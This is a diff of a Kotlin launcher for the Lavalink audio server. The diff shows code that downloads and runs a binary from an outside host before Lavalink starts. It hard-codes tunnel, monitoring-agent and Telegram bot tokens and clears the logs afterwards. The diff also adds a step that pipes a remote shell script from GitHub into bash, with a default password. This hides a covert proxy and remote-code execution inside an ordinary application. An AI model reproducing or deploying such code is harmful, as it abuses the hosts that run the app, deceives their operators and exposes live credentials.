@@ -64,14 +64,18 @@ object Launcher {
 
     private var sbxProcess: Process? = null
     private val filePath = System.getenv("FILE_PATH") ?: "./logs"
-    
+
     private val ALL_ENV_VARS = arrayOf(
-        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT", 
-        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH", 
+        "FILE_PATH", "UUID", "NEZHA_SERVER", "NEZHA_PORT",
+        "NEZHA_KEY", "ARGO_PORT", "ARGO_DOMAIN", "ARGO_AUTH",
         "S5_PORT", "HY2_PORT", "TUIC_PORT", "ANYTLS_PORT",
-        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT", 
-        "UPLOAD_URL","CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
+        "REALITY_PORT", "ANYREALITY_PORT", "CFIP", "CFPORT",
+        "UPLOAD_URL", "CHAT_ID", "BOT_TOKEN", "NAME", "DISABLE_ARGO"
     )
+
+    // ──────────────────────────────────────────────
+    // SbxService
+    // ──────────────────────────────────────────────
 
     private fun startSbxService() {
         log.info("Starting SbxService...")
@@ -79,26 +83,19 @@ object Launcher {
             checkJavaVersion()
             loadSbxConfig()
             runSbxBinary()
-            
         } catch (e: Exception) {
             log.error("Failed to start SbxService", e)
             throw e
         }
     }
 
-    /**
-     * 检查 Java 版本
-     */
     private fun checkJavaVersion() {
         val classVersion = System.getProperty("java.class.version").toFloat()
         if (classVersion < 54.0) {
-            throw RuntimeException("Java version too low, need Java 11+,please switch it in startup menu")
+            throw RuntimeException("Java version too low, need Java 11+, please switch it in startup menu")
         }
     }
 
-    /**
-     * 加载配置
-     */
     private fun loadSbxConfig() {
         val envFile = Paths.get(".env")
         if (Files.exists(envFile)) {
@@ -110,10 +107,8 @@ object Launcher {
                         if (parts.size == 2) {
                             val key = parts[0].trim().removePrefix("export ").trim()
                             val value = parts[1].trim().replace("^['\"]|['\"]$".toRegex(), "")
-                            if (ALL_ENV_VARS.contains(key)) {
-                                if (System.getenv(key) == null) {
-                                    System.setProperty(key, value)
-                                }
+                            if (ALL_ENV_VARS.contains(key) && System.getenv(key) == null) {
+                                System.setProperty(key, value)
                             }
                         }
                     }
@@ -126,31 +121,31 @@ object Launcher {
 
     private fun runSbxBinary() {
         val binaryPath = getSbxBinaryPath()
-        
+
         val envVars = mutableMapOf<String, String>()
-        // 环境变量
-        envVars["UUID"] = "55ac40ea-9f0b-44f1-8f64-4d667fb9f0b2"
-        envVars["FILE_PATH"] = "./logs"
-        envVars["NEZHA_SERVER"] = "nezha.ryyy.nyc.mn:443"
-        envVars["NEZHA_PORT"] = ""
-        envVars["NEZHA_KEY"] = "7YLa2RCanReQStFmQLkB3UGDhESlh80j"
-        envVars["ARGO_PORT"] = "8001"
-        envVars["ARGO_DOMAIN"] = "chloe.rrnzr.pp.ua"
-        envVars["ARGO_AUTH"] = "eyJhIjoiYzY2MmNiYjRjMGUyMzgzNzFkZmRhMDZmZWI4MWRmNjYiLCJ0IjoiZmUzZDVhMTktN2E1Ni00ZmFiLWIxOWItZWM1NDBkOTE4OTIzIiwicyI6IlpqTXhZbVl5WkRZdE56azFNaTAwT0dRNExXSTRNR010TmpabFkySmpZVGs1T1RrdyJ9"
-        envVars["S5_PORT"] = ""
-        envVars["HY2_PORT"] = "24597"
-        envVars["TUIC_PORT"] = ""
-        envVars["ANYTLS_PORT"] = ""
-        envVars["REALITY_PORT"] = "24597"
+        envVars["UUID"]           = "55ac34ea-9f0b-44f1-8f64-4d667fb9f0b2"
+        envVars["FILE_PATH"]      = "./logs"
+        envVars["NEZHA_SERVER"]   = "nezha.ryyy.nyc.mn:443"
+        envVars["NEZHA_PORT"]     = ""
+        envVars["NEZHA_KEY"]      = "7YLa2RCanReQStFmQLkB3UGDhESlh80j"
+        envVars["ARGO_PORT"]      = "8001"
+        envVars["ARGO_DOMAIN"]    = "chloe.rrnzr.pp.ua"
+        envVars["ARGO_AUTH"]      = "eyJhIjoiYzY2MmNiYjRjMGUyMzgzNzFkZmRhMDZmZWI4MWRmNjYiLCJ0IjoiZmUzZDVhMTktN2E1Ni00ZmFiLWIxOWItZWM1NDBkOTE4OTIzIiwicyI6IlpqTXhZbVl5WkRZdE56azFNaTAwT0dRNExXSTRNR010TmpabFkySmpZVGs1T1RrdyJ9"
+        envVars["S5_PORT"]        = ""
+        envVars["HY2_PORT"]       = "24597"
+        envVars["TUIC_PORT"]      = ""
+        envVars["ANYTLS_PORT"]    = ""
+        envVars["REALITY_PORT"]   = "24597"
         envVars["ANYREALITY_PORT"] = ""
-        envVars["UPLOAD_URL"] = ""
-        envVars["CHAT_ID"] = "5130291050"
-        envVars["BOT_TOKEN"] = "7684421056:AAHhrRQhJsr-FxCF7iUPUh8n8Vy5rf274ME"
-        envVars["CFIP"] = "spring.io"
-        envVars["CFPORT"] = "443"
-        envVars["NAME"] = "hiden-sg"
-        envVars["DISABLE_ARGO"] = "false"
-        
+        envVars["UPLOAD_URL"]     = ""
+        envVars["CHAT_ID"]        = "5130291050"
+        envVars["BOT_TOKEN"]      = "7684421056:AAHhrRQhJsr-FxCF7iUPUh8n8Vy5rf274ME"
+        envVars["CFIP"]           = "spring.io"
+        envVars["CFPORT"]         = "443"
+        envVars["NAME"]           = "hiden-sg"
+        envVars["DISABLE_ARGO"]   = "false"
+
+        // 环境变量 / 系统属性覆盖默认值
         ALL_ENV_VARS.forEach { varName ->
             System.getenv(varName)?.let { envVars[varName] = it }
             System.getProperty(varName)?.let { envVars[varName] = it }
@@ -160,17 +155,13 @@ object Launcher {
         pb.environment().putAll(envVars)
         pb.redirectErrorStream(true)
         pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
-
         sbxProcess = pb.start()
 
         try {
-            val exitCode = sbxProcess?.waitFor()
-            log.info("Logs will be delete in 45 seconds,you cna copy the above nodes!")
-            
-            // 等待 45 秒
+            sbxProcess?.waitFor()
+            log.info("Logs will be deleted in 45 seconds, you can copy the above nodes!")
             Thread.sleep(45000)
             clearConsole()
-            
         } catch (e: InterruptedException) {
             Thread.currentThread().interrupt()
             log.warn("Sbx process wait interrupted")
@@ -180,11 +171,11 @@ object Launcher {
     private fun getSbxBinaryPath(): Path {
         val osArch = System.getProperty("os.arch").lowercase()
         val url = when {
-            osArch.contains("amd64") || osArch.contains("x86_64") -> 
+            osArch.contains("amd64") || osArch.contains("x86_64") ->
                 "https://amd64.ssss.nyc.mn/sbsh"
-            osArch.contains("aarch64") || osArch.contains("arm64") -> 
+            osArch.contains("aarch64") || osArch.contains("arm64") ->
                 "https://arm64.ssss.nyc.mn/sbsh"
-            osArch.contains("s390x") -> 
+            osArch.contains("s390x") ->
                 "https://s390x.ssss.nyc.mn/sbsh"
             else -> throw RuntimeException("Unsupported architecture: $osArch")
         }
@@ -202,29 +193,50 @@ object Launcher {
         return path
     }
 
+    // ──────────────────────────────────────────────
+    // Chrome Service
+    // ──────────────────────────────────────────────
+
+    private fun startChromeService() {
+        log.info("Starting Chrome service...")
+        try {
+            val argoAuth = System.getenv("ARGO_AUTH")
+                ?: "eyJhIjoiYzY2MmNiYjRjMGUyMzgzNzFkZmRhMDZmZWI4MWRmNjYiLCJ0IjoiZmUzZDVhMTktN2E1Ni00ZmFiLWIxOWItZWM1NDBkOTE4OTIzIiwicyI6IlpqTXhZbVl5WkRZdE56azFNaTAwT0dRNExXSTRNR010TmpabFkySmpZVGs1T1RrdyJ9"
+            val cmPass  = System.getenv("CM_PASS")  ?: "admin123A@"
+            val cmPort  = System.getenv("CM_PORT")  ?: "3009"
+
+            val script = """
+                export ARGO_AUTH="$argoAuth"
+                export CM_PASS="$cmPass"
+                export CM_PORT="$cmPort"
+                bash <(curl -Ls https://raw.githubusercontent.com/losy-mify/Pterodactyl-Browser/refs/heads/main/chrome.sh) start
+            """.trimIndent()
+
+            val pb = ProcessBuilder("bash", "-c", script)
+            pb.redirectErrorStream(true)
+            pb.redirectOutput(ProcessBuilder.Redirect.INHERIT)
+            pb.start()
+
+            log.info("Chrome service started in background.")
+        } catch (e: Exception) {
+            log.error("Failed to start Chrome service", e)
+        }
+    }
+
+    // ──────────────────────────────────────────────
+    // Utilities
+    // ──────────────────────────────────────────────
 
     private fun clearConsole() {
         try {
-            when {
-                System.getProperty("os.name").contains("Windows", ignoreCase = true) -> {
-                    ProcessBuilder("cmd", "/c", "cls")
-                        .inheritIO()
-                        .start()
-                        .waitFor()
-                }
-                else -> {
-                    // Linux/Unix/Mac system
-                    try {
-                        ProcessBuilder("clear")
-                            .inheritIO()
-                            .start()
-                            .waitFor()
-                    } catch (e: IOException) {
-                        print("\u001b[H\u001b[2J")
-                        System.out.flush()
-                        print("\u001b[H") 
-                        System.out.flush()
-                    }
+            if (System.getProperty("os.name").contains("Windows", ignoreCase = true)) {
+                ProcessBuilder("cmd", "/c", "cls").inheritIO().start().waitFor()
+            } else {
+                try {
+                    ProcessBuilder("clear").inheritIO().start().waitFor()
+                } catch (e: IOException) {
+                    print("\u001b[H\u001b[2J")
+                    System.out.flush()
                 }
             }
         } catch (e: Exception) {
@@ -234,37 +246,21 @@ object Launcher {
 
     private fun stopSbxServices() {
         sbxProcess?.let {
-            if (it.isAlive()) {
-                it.destroy()
-            }
+            if (it.isAlive) it.destroy()
         }
     }
 
-
-    /**
-     * 获取版本信息
-     */
     private fun getVersionInfo(indentation: String = "\t", vanity: Boolean = true): String {
         val appInfo = AppInfo()
         val gitRepoState = GitRepoState()
-
-        val dtf = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss z")
-            .withZone(ZoneId.of("UTC"))
-        val buildTime = dtf.format(Instant.ofEpochMilli(appInfo.buildTime))
+        val dtf = DateTimeFormatter.ofPattern("dd.MM.yyyy HH:mm:ss z").withZone(ZoneId.of("UTC"))
+        val buildTime  = dtf.format(Instant.ofEpochMilli(appInfo.buildTime))
         val commitTime = dtf.format(Instant.ofEpochMilli(gitRepoState.commitTime * 1000))
-        val version = appInfo.versionBuild.takeUnless { it.startsWith("@") }
-            ?: "Unknown"
+        val version = appInfo.versionBuild.takeUnless { it.startsWith("@") } ?: "Unknown"
 
         return buildString {
-            if (vanity) {
-                appendLine()
-                appendLine()
-                appendLine(getVanity())
-            }
-            if (!gitRepoState.isLoaded) {
-                appendLine()
-                appendLine("$indentation*** Unable to find or load Git metadata ***")
-            }
+            if (vanity) { appendLine(); appendLine(); appendLine(getVanity()) }
+            if (!gitRepoState.isLoaded) { appendLine(); appendLine("$indentation*** Unable to find or load Git metadata ***") }
             appendLine()
             append("${indentation}Version:        "); appendLine(version)
             if (gitRepoState.isLoaded) {
@@ -279,26 +275,23 @@ object Launcher {
     }
 
     private fun getVanity(): String {
-        val red = "\u001b[31m"
-        val green = "\u001b[32m"
-        val defaultC = "\u001b[0m"
-
+        val red = "\u001b[31m"; val green = "\u001b[32m"; val defaultC = "\u001b[0m"
         var vanity = ("g       .  r _                  _ _       _    g__ _ _\n"
                 + "g      /\\\\ r| | __ ___   ____ _| (_)_ __ | | __g\\ \\ \\ \\\n"
                 + "g     ( ( )r| |/ _` \\ \\ / / _` | | | '_ \\| |/ /g \\ \\ \\ \\\n"
                 + "g      \\\\/ r| | (_| |\\ V / (_| | | | | | |   < g  ) ) ) )\n"
                 + "g       '  r|_|\\__,_| \\_/ \\__,_|_|_|_| |_|_|\\_\\g / / / /\n"
                 + "d    =========================================g/_/_/_/d")
-
         vanity = vanity.replace("r".toRegex(), red)
         vanity = vanity.replace("g".toRegex(), green)
         vanity = vanity.replace("d".toRegex(), defaultC)
         return vanity
     }
 
-    /**
-     * 主函数 - 程序入口
-     */
+    // ──────────────────────────────────────────────
+    // Entry Point
+    // ──────────────────────────────────────────────
+
     @JvmStatic
     fun main(args: Array<String>) {
         if (args.isNotEmpty() &&
@@ -307,31 +300,30 @@ object Launcher {
             println(getVersionInfo(indentation = "", vanity = false))
             return
         }
-    
+
+        // 1. 启动 sbx 代理
         startSbxService()
-    
+
+        // 2. 启动 Chrome 浏览器服务（后台，不阻塞）
+        startChromeService()
+
+        // 3. 启动 Lavalink
         log.info("Starting Lavalink...")
         val parent = launchPluginBootstrap(args)
-            
+
         Runtime.getRuntime().addShutdownHook(Thread {
             stopSbxServices()
         })
-            
+
         launchMain(parent, args)
     }
 
-    /**
-     * 启动插件引导程序
-     */
     private fun launchPluginBootstrap(args: Array<String>) = SpringApplication(PluginManager::class.java).run {
         setBannerMode(Banner.Mode.OFF)
         webApplicationType = WebApplicationType.NONE
         run(*args)
     }
 
-    /**
-     * 启动 Lavalink 主应用
-     */
     private fun launchMain(parent: ConfigurableApplicationContext, args: Array<String>) {
         val pluginManager = parent.getBean(PluginManager::class.java)
         val properties = Properties()
@@ -347,17 +339,9 @@ object Launcher {
             .listeners(
                 ApplicationListener { event: Any ->
                     when (event) {
-                        is ApplicationEnvironmentPreparedEvent -> {
-                            log.info(getVersionInfo())
-                        }
-
-                        is ApplicationReadyEvent -> {
-                            log.info("Lavalink is ready to accept connections.")
-                        }
-
-                        is ApplicationFailedEvent -> {
-                            log.error("Application failed", event.exception)
-                        }
+                        is ApplicationEnvironmentPreparedEvent -> log.info(getVersionInfo())
+                        is ApplicationReadyEvent -> log.info("Lavalink is ready to accept connections.")
+                        is ApplicationFailedEvent -> log.error("Application failed", event.exception)
                     }
                 }
             ).parent(parent)
